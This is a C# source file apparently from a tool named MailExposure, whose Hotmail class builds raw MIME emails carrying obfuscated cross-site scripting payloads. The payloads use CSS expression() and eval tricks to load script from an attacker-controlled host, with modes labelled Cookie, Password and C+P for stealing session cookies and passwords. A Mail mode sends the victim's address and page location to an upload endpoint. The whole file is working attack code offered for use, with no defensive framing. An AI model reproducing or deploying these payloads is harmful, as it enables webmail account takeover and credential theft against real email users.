using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using MailExposure.RecordInfo;

namespace MailExposure.MailXssCode
{
    class Hotmail
    {
        // Fields
        private string CRLF;

        // Methods
        public Hotmail()
        {
            CRLF = "\r\n";
        }
        public string MailPackage(Model model)
        {
            this.Xss(model);
            if (model.AttachmentName == null)
            {
                return ("From:" + model.Addresser + "<" + model.Addresser + ">" + this.CRLF + "To:" + model.Addressee + this.CRLF + "Subject:" + model.Subject + this.CRLF + "MIME-Version: 1.0" + this.CRLF + "Content-Type: multipart/mixed;" + this.CRLF + "\tboundary=\"----=_Part_116410_1729540330.1274776237859\"" + this.CRLF + this.CRLF + "------=_Part_116410_1729540330.1274776237859" + this.CRLF + "Content-Type: multipart/alternative;" + this.CRLF + "\tboundary=\"----=_Part_116412_1100804047.1274776237859\"" + this.CRLF + this.CRLF + "------=_Part_116412_1100804047.1274776237859" + this.CRLF + "Content-Type: text/html; charset=\"gbk\"" + this.CRLF + "Content-Transfer-Encoding: base64" + this.CRLF + this.CRLF + model.EncodeBase64(model.XSSCode + model.Content + "</div>") + this.CRLF + "------=_Part_116412_1100804047.1274776237859--" + this.CRLF + this.CRLF + "." + this.CRLF);
            }
            string code = new StreamReader(model.AttachmentSrc, Encoding.GetEncoding("gb2312")).ReadToEnd();
            return string.Concat(new object[] 
            { 
                "MIME-Version: 1.0", this.CRLF, "Content-Type: multipart/mixed; boundary=Mail_Boundary_00201010", this.CRLF, "From:", model.Addresser, "<", model.Addresser, ">", this.CRLF, "To:", model.Addressee, this.CRLF, "Subject:", model.Subject, this.CRLF, 
                this.CRLF, "Content-Type: multipart/alternative; boundary=Mail_Boundary_00201010", this.CRLF, this.CRLF, "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=\"gbk\"", this.CRLF, "Content-Transfer-Encoding: 7bit", this.CRLF, this.CRLF, this.CRLF, model.XSSCode, model.Content, this.CRLF, this.CRLF, 
                "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=\"gbk\"file=", model.AttachmentName, this.CRLF, "Content-Transfer-Encoding: base64", this.CRLF, "Content-Disposition: attachment;filename=", model.AttachmentName, this.CRLF, this.CRLF, '<', model.EncodeBase64(code), '>', this.CRLF, "--Mail_Boundary_00201010--", 
                this.CRLF, this.CRLF, '.', this.CRLF
            });
        }

        private void Xss(Model model)
        {
            Record record = new Record();
            if (model.Type == "Cookie")
            {
                model.Address = "http://" + record.Dns("") + "/hotmail/indexC.asp?";
                model.XSSCode = "<div id=\"fdList\" title=\"document.write(String.fromCharCode(60)+'script'+String.fromCharCode(62)+String.fromCharCode(60)+'/script'+String.fromCharCode(62)+String.fromCharCode(60)+'script src=" + model.Address + "uid=" + model.Addressee + "'+String.fromCharCode(62)+String.fromCharCode(60)+'/script'+String.fromCharCode(62));yyll=111;\"></div>" + this.CRLF + "<style>" + this.CRLF + "#fdList{" + this.CRLF + "color: rgb(''abc\"x:expression((window.yyll==111)?xxyy=6:(eval(ecxfdList.title)));" + this.CRLF + "}" + this.CRLF + "</style>" + this.CRLF;
            }
            else if (model.Type == "Password")
            {
                model.Address = "http://" + record.Dns("") + "/hotmail/index.asp?";
                model.XSSCode = "<div id=\"fdList\" title=\"document.write(String.fromCharCode(60)+'script'+String.fromCharCode(62)+String.fromCharCode(60)+'/script'+String.fromCharCode(62)+String.fromCharCode(60)+'script src=" + model.Address + "uid=" + model.Addressee + "'+String.fromCharCode(62)+String.fromCharCode(60)+'/script'+String.fromCharCode(62));yyll=111;\"></div>" + this.CRLF + "<style>" + this.CRLF + "#fdList{" + this.CRLF + "color: rgb(''abc\"x:expression((window.yyll==111)?xxyy=6:(eval(ecxfdList.title)));" + this.CRLF + "}" + this.CRLF + "</style>" + this.CRLF;
            }
            else if (model.Type == "C+P")
            {
                model.Address = "http://" + record.Dns("") + "/hotmail/indexCP.asp?";
                model.XSSCode = "<div id=\"fdList\" title=\"document.write(String.fromCharCode(60)+'script'+String.fromCharCode(62)+String.fromCharCode(60)+'/script'+String.fromCharCode(62)+String.fromCharCode(60)+'script src=" + model.Address + "uid=" + model.Addressee + "'+String.fromCharCode(62)+String.fromCharCode(60)+'/script'+String.fromCharCode(62));yyll=111;\"></div>" + this.CRLF + "<style>" + this.CRLF + "#fdList{" + this.CRLF + "color: rgb(''abc\"x:expression((window.yyll==111)?xxyy=6:(eval(ecxfdList.title)));" + this.CRLF + "}" + this.CRLF + "</style>" + this.CRLF;
            }
            else if (model.Type == "Mail")
            {
                string str = "";
                Random random = new Random();
                for (int i = 0; i < 6; i++)
                {
                    str = str + random.Next(10).ToString();
                }
                model.Address = "http://" + record.Dns("") + "/upload/index.php";
                model.XSSCode = "<style>" + this.CRLF + "p,font,table{" + this.CRLF + "top:rgb('88',80,'180);" + this.CRLF + "top:rgb(') !important" + this.CRLF + "height:expression(  (window.r==123)?x=8:(eval(code.title)==20088) || (r=123)       );}" + this.CRLF + "</style>" + this.CRLF + "abcdefg<div id=code title=\"emailkey='" + str + "';window.onerror=function(){return true;};if(window.ufoufoufo!=1) {framedir='" + model.Address + "';yyuser='" + model.Addressee + "';_x_=document.createElement('SCRIPT');_x_.src=framedir+'?key='+emailkey+'&amp;msg='+escape('-'+yyuser+'^-!!-'+document.location);document.insertBefore(_x_,document.getElementsByTagName('*')[0]);ufoufoufo=1;}\"></div><p>-</p><font>-</font>";
            }
        }
    }
}
